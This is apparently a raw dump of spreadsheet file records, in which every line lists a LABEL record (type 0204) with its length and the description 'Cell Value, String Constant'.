' 0204     14 LABEL : Cell Value, String Constant
' 0204     13 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     11 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     13 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     13 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     15 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     15 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     15 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     17 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     17 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     13 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     17 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     13 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     15 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     11 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     17 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     15 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     13 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     13 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     17 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     15 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     13 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     19 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     17 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     13 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     13 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     11 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     13 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     15 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     13 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     13 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     15 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     13 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     19 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     17 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     16 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     13 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     15 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     15 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     15 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     15 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     13 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     13 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     17 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     17 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     15 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     15 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     13 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     15 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     15 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     15 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     15 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     18 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     13 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     15 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     13 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     13 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     15 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     15 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     17 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     15 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     13 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     16 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     13 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     16 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     18 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     18 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     13 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     13 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     13 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     18 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     13 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     13 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     13 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     13 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     13 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     15 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     13 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     13 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     11 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     16 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     17 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     19 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     13 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     15 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     15 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     15 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     15 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     13 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     13 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     13 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     15 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     16 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     19 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     19 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     15 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     13 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     17 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     13 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     13 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     13 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     13 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     13 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     16 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     11 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     19 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     13 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     13 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     11 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     16 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     16 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     19 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     13 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     19 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     13 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     13 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     13 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     19 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     16 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     13 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     16 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     13 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     11 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     13 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     13 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     19 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     15 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     19 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     19 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     16 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     11 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     11 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     13 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     13 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     19 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     13 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     13 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     13 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     13 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     13 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     13 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     13 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     13 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     15 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     13 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     13 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     13 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     13 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     13 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     13 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     13 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     15 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     13 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     11 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     11 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     11 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     15 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     15 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     13 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     13 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     15 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     15 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     16 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     13 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     13 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     16 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     13 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     13 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     13 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     16 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     19 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     13 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     11 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     13 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     13 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     18 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     17 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     13 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     19 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     13 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     13 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     13 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     15 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     11 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     13 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     19 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     13 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     17 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
